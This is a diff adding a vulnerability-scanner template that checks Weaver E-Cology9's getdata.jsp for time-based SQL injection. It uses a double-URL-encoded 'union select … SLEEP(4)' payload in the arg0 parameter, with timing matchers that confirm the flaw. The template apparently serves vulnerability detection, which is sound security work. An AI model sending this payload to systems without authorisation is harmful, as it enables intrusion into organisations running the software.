@@ -1,0 +1,37 @@
+id: QVD-2025-23834
+
+info:
+  name: 泛微E Cology9 getdata.jsp SQL注入漏洞
+  author: Cology9
+  severity: high
+  tags: Cology9
+
+http:
+  - raw:
+      - |+
+        GET /js/hrm/getdata.jsp?cmd=savect&arg0=&arg1=1&arg2=2&arg3=3 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+
+      - |+
+        GET /js/hrm/getdata.jsp?cmd=savect&arg0=%2531%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2533%252c%2534%252c%2535%252c%2553%254c%2545%2545%2550%2528%2534%2529%2520%2523&arg1=1&arg2=2&arg3=3 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_1 < 2'
+          - 'duration_2 >= 4'
+          - 'duration_2 <= 10'
+          - 'len(body) < 90'
+        condition: and
+
